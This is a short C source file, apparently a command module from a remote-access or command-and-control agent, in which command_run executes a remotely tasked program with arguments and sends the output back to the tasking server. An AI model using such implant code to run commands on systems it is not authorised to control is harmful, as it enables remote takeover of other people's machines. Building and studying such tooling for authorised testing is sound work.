#define _WIN32_WINNT 0x0600
#include "commands.h"
#include "utils.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#ifdef INCLUDE_CMD_RUN

void command_run(char *task_id, char *params) {
  char executable[512] = {0};
  char arguments[1024] = {0};

  if (params[0] == '{') {
    extract_json_string(params, "executable", executable, sizeof(executable));
    extract_json_string(params, "arguments", arguments, sizeof(arguments));
  } else {
    strncpy(arguments, params, sizeof(arguments) - 1);
  }

  if (strlen(executable) == 0) {
    send_task_response(task_id, "Error: executable is required for run");
    return;
  }

  char *output = execute_process(executable, arguments);
  send_task_response(task_id, output);
  if (output)
    free(output);
}

#endif
